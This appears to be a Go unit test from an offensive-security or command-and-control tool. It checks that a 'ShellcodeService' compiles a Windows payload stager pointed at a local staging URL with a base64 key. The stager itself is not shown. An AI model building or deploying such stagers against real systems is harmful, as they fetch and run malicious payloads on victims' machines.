package services

import (
	"os"
	"path/filepath"
	"testing"
)

// TestBuildGoStager verifies the stager template compiles with a pure-stdlib
// module and no network (GOPROXY=off). It exercises findGo + buildGoStager.
func TestBuildGoStager(t *testing.T) {
	if _, err := findGo(); err != nil {
		t.Skipf("no go toolchain available: %v", err)
	}
	ss := &ShellcodeService{}
	// exeDir() points at the test binary dir; override payloads path is fine.
	cfg := ShellcodeConfig{TargetOS: "windows", TargetArch: "amd64"}
	dir, err := os.MkdirTemp("", "stager-out-*")
	if err != nil {
		t.Fatal(err)
	}
	defer os.RemoveAll(dir)
	cfg.OutputPath = filepath.Join(dir, "stager.exe")

	out, err := ss.buildGoStager(cfg, "http://127.0.0.1:4445/stage/tok", "a2V5")
	if err != nil {
		t.Fatalf("buildGoStager: %v", err)
	}
	fi, err := os.Stat(out)
	if err != nil {
		t.Fatalf("stat output: %v", err)
	}
	if fi.Size() < 10000 {
		t.Fatalf("stager suspiciously small: %d", fi.Size())
	}
	t.Logf("stager built: %s (%d bytes)", out, fi.Size())
}
